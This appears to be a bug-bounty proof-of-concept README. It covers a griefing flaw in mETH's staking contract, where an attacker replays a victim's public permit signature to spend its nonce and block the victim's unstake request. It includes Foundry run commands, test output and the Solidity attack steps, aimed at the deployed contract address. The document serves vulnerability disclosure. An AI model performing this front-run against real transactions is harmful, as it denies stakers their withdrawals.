# mETH — `unstakeRequestWithPermit` griefable by permit front-running

**Severity:** Medium · **Payout:** MEDIUM **$5,000** · **Status:** PoC green, not yet submitted

**Full finding with impact mapping, audit-coverage gap and suggested fix:**
[`docs/METH-permit-frontrunning.md`](../../docs/METH-permit-frontrunning.md)

This directory holds the executable proof. It was written against a local clone of
`mantle-lsp/contracts` and, like `poc/IPOR_solvency/`, is **not** self-contained —
it imports the project's own `src/` tree and reuses its `Staking.t.sol` /
`SignerUtils.sol` test harness.

## Running it

```bash
git clone --recurse-submodules https://github.com/mantle-lsp/contracts.git
cd contracts
forge build

cp /path/to/ChainScope/poc/METH_permit_frontrunning/PermitFrontRunning.t.sol test/

forge test --match-contract PermitFrontRunning -vv
```

Last run against this checkout:

```
[PASS] testPermitUnstakeGriefedByFrontRunner() (gas: 163976)
[PASS] testPermitUnstakeSucceedsWhenNotFrontRun() (gas: 230180)
Suite result: ok. 2 passed; 0 failed; 0 skipped
```

The control test is the point of the pair. `…SucceedsWhenNotFrontRun` shows the
function works correctly on its own, so the second test failing is attributable to
the front-run and not to a broken harness.

## The bug, in five lines

```solidity
// 1. Victim signs and broadcasts. (v, r, s) are calldata — anyone can read them.
(uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, SignerUtils.getTypedDataHash(mETH.DOMAIN_SEPARATOR(), permit));

// 2. ATTACKER replays the victim's own signature, front-running the request.
vm.prank(attacker);
mETH.permit(victim, address(staking), methAmount, deadline, v, r, s);

// 3. The nonce is consumed by the attacker's call.
assertGt(mETH.nonces(victim), nonceBefore);

// 4. The victim's still-pending transaction can no longer be valid.
vm.prank(victim);
vm.expectRevert("ERC20Permit: invalid signature");
staking.unstakeRequestWithPermit(methAmount, 0, deadline, v, r, s);
```

The withdrawal is never created. The attacker gains nothing — which is what puts
this in mETH's published **Medium** tier ("Griefing … no profit motive for an
attacker, but damage to the users or the protocol") rather than High.

## Why the deployed contract is affected

Verified against bytecode, not source — see the full finding for the method:

| Check | Result |
|---|---|
| Staking proxy | EIP-1967 → `0x01a360392c74b5b8bf4973f438ff3983507a06a2` |
| Sourcify | `exact_match`, verified 2025-10-30 |
| Deployed vs repo `Staking.sol` | byte-identical, md5 `7ca18fb00d4884b087e971a2674e3bac` |
| `unstakeRequestWithPermit(uint128,uint128,uint256,uint8,bytes32,bytes32)` | present on deployed bytecode |
| `allowance` occurrences in deployed `Staking.sol` | **0** |

That last row is the one that matters for severity. A contract that granted
`Staking` an ERC-20 allowance would let the protocol pull the permit-signed funds
itself, and the front-run would be benign — the attacker's `permit` would just
hand the same allowance to the same spender. With zero allowance references, the
signature is spent and the request is gone.

## Precedent

The same class was reported on Lido DAO as issue #803, rated Medium and **paid**,
and remains open with the label `next upgrade`. Same shape: a permit signature
rides in public calldata, the nonce is single-use, and the legitimate caller
loses.
